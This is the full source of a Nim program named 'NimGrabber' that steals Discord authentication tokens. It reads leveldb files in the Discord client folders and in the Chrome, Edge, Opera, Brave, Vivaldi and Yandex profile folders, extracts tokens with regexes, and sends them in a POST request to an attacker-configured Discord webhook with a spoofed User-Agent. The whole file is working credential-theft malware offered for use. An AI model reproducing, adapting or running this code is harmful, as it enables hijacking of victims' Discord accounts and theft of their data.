# ============ #
# NullCode1337 #
# ============ #
import json, httpclient, os, re
from sequtils import deduplicate
from strutils import strip
from strutils import splitLines

# User fillable variables
# -----------------------
let 
  webhook = "https://discord.com/api/webhooks/309039409032/you-only-live-once"
  userid: int64 = 2345678909876543

# Do not touch the following
# --------------------------
var
  roaming = getenv("appdata")
  local = getenv("localappdata")
  tkpaths: seq[string] = @[]
  tokens*: seq[string] = @[]
  hooktks = ""
  
let paths = [
  roaming & r"\Discord",                        roaming & r"\discordptb", roaming & r"\discordcanary",
  roaming & r"\Lightcord",                      local & r"\Google\Chrome\User Data\Default",
  local & r"\Microsoft\Edge\User Data\Default", roaming & r"\Opera Software\Opera Stable",
  roaming & r"\Opera Software\Opera GX Stable", local & r"\BraveSoftware\Brave-Browser\User Data\Default",
  local & r"\Vivaldi\User Data\Default",        local & r"\Yandex\YandexBrowser\User Data\Default"
]

let 
  begin: string = "<@" & $userid & ">\n" & "**__Tokens grabbed by NimGrabber__**: \n"
  regex = [re"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", re"mfa\.[\w-]{84}"]
  
proc getTokens(path: string): seq[string] =
    if dirExists(path) == true:
        var path = path & r"\Local Storage\leveldb"
        try: 
            setCurrentDir(path) 
            for file in walkDirRec path:
                if file.match re".*\.log":
                    tkpaths.add(file)
                if file.match re".*\.ldb":
                    tkpaths.add(file)
        except OSError: 
            return @["no"]
        for tk in tkpaths:
            var contents = readfile(tk)
            var split = contents.splitLines()
            for line in split:
                for r in regex:
                    tokens.add(findAll(line, r))
        return tokens
    else: 
        return @["no"]
        
let client = newHttpClient()
client.headers = newHttpHeaders({ 
    "Content-Type": "application/json", 
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246" 
})

for a in paths: 
    var x: seq[string] = getTokens(a)
    if x[0] == "no": 
        continue

if tokens.len == 0: # Just in case no token ever gets found 
    tokens.add("No tokens found!")
    
tokens = tokens.deduplicate
for c in tokens: hooktks.add(c & "\n")
hooktks = "```\n" & hooktks.strip(leading=false) & "```"
var data = %*{ 
    "content": begin & hooktks, 
    "username": "Nim666" 
}

discard client.request(webhook, httpMethod = HttpPost, body = $data)
